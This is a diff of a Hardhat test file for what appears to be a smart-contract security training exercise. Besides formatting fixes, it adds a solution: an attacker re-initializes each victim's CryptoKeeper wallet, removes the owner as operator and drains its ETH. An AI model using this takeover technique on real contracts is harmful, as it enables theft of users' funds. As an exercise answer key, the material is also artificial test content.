@@ -17,7 +17,7 @@ describe('Calls Attacks Exercise 3', function () {
             'contracts/utils/DummyERC20.sol:DummyERC20',
             deployer
         );
-        this.token = await TokenFactory.deploy("Dummy ERC20", "DToken", ethers.utils.parseEther('1000'))
+        this.token = await TokenFactory.deploy("Dummy ERC20", "DToken", ethers.utils.parseEther('1000'));
 
         // Deploy Template and Factory
         const CryptoKeeperTemplateFactory = await ethers.getContractFactory(
@@ -36,7 +36,7 @@ describe('Calls Attacks Exercise 3', function () {
         // User1 creating CryptoKeepers
         const User1Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user1.address));
         const cryptoKeeper1Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User1Salt);
-        await this.cryptoKeeperFactory.connect(user1).createCryptoKeeper(User1Salt, [user1.address])
+        await this.cryptoKeeperFactory.connect(user1).createCryptoKeeper(User1Salt, [user1.address]);
         this.cryptoKeeper1 = await ethers.getContractAt(
             'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
             cryptoKeeper1Address
@@ -44,7 +44,7 @@ describe('Calls Attacks Exercise 3', function () {
         // User2 creating CryptoKeepers
         const User2Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user2.address));
         const cryptoKeeper2Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User2Salt);
-        await this.cryptoKeeperFactory.connect(user2).createCryptoKeeper(User2Salt, [user2.address])
+        await this.cryptoKeeperFactory.connect(user2).createCryptoKeeper(User2Salt, [user2.address]);
         this.cryptoKeeper2 = await ethers.getContractAt(
             'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
             cryptoKeeper2Address
@@ -52,7 +52,7 @@ describe('Calls Attacks Exercise 3', function () {
         // User3 creating CryptoKeepers
         const User3Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user3.address));
         const cryptoKeeper3Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User3Salt);
-        await this.cryptoKeeperFactory.connect(user3).createCryptoKeeper(User3Salt, [user3.address])
+        await this.cryptoKeeperFactory.connect(user3).createCryptoKeeper(User3Salt, [user3.address]);
         this.cryptoKeeper3 = await ethers.getContractAt(
             'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
             cryptoKeeper3Address
@@ -74,32 +74,64 @@ describe('Calls Attacks Exercise 3', function () {
 
         // cryptoKeeper operation works
         this.cryptoKeeper1.connect(user1).executeWithValue(
-            user2.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
-        )
+            user2.address, "0x", ethers.utils.parseEther('1'), { value: ethers.utils.parseEther('1') }
+        );
         this.cryptoKeeper2.connect(user2).executeWithValue(
-            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
-        )
+            user1.address, "0x", ethers.utils.parseEther('1'), { value: ethers.utils.parseEther('1') }
+        );
         this.cryptoKeeper3.connect(user3).executeWithValue(
-            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
-        )
+            user1.address, "0x", ethers.utils.parseEther('1'), { value: ethers.utils.parseEther('1') }
+        );
 
         // Only operator can manage wallet
         // addOperator fails
-        await expect(this.cryptoKeeper1.connect(user2).addOperator(user2.address)).to.be.revertedWith("Not an operator")
+        await expect(this.cryptoKeeper1.connect(user2).addOperator(user2.address)).to.be.revertedWith("Not an operator");
         // executeWithValue fails
         await expect(this.cryptoKeeper1.connect(user2).executeWithValue(
-            user2.address, "0x", ethers.utils.parseEther('1'))).to.be.revertedWith("Not an operator")
+            user2.address, "0x", ethers.utils.parseEther('1'))).to.be.revertedWith("Not an operator");
         // execute fails
-        const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address])
+        const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address]);
         await expect(this.cryptoKeeper1.connect(user2).execute(
             this.token.address, callData, CALL_OPERATION)).to.be.revertedWith("Not an operator");
 
         this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
-        
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+
+
+        await this.cryptoKeeper1.connect(attacker).initialize([attacker.address]);
+        await this.cryptoKeeper1.connect(attacker).removeOperator(user1.address);
+        await this.cryptoKeeper1.connect(attacker).executeWithValue(
+            attacker.address,
+            "0x",
+            ethers.provider.getBalance(this.cryptoKeeper1.address)
+        );
+
+
+        await this.cryptoKeeper2.connect(attacker).initialize([attacker.address]);
+        await this.cryptoKeeper2.connect(attacker).removeOperator(user2.address);
+        await this.cryptoKeeper2.connect(attacker).executeWithValue(
+            attacker.address,
+            "0x",
+            ethers.provider.getBalance(this.cryptoKeeper2.address)
+        );
+
+        await this.cryptoKeeper3.connect(attacker).initialize([attacker.address]);
+        await this.cryptoKeeper3.connect(attacker).removeOperator(user3.address);
+        await this.cryptoKeeper3.connect(attacker).executeWithValue(
+            attacker.address,
+            "0x",
+            ethers.provider.getBalance(this.cryptoKeeper3.address)
+        );
+
+        // await this.cryptoKeeper2.connect(attacker).initialize([attacker.address]);
+        // await this.cryptoKeeper3.connect(attacker).initialize([attacker.address]);
+
+
 
     });
 
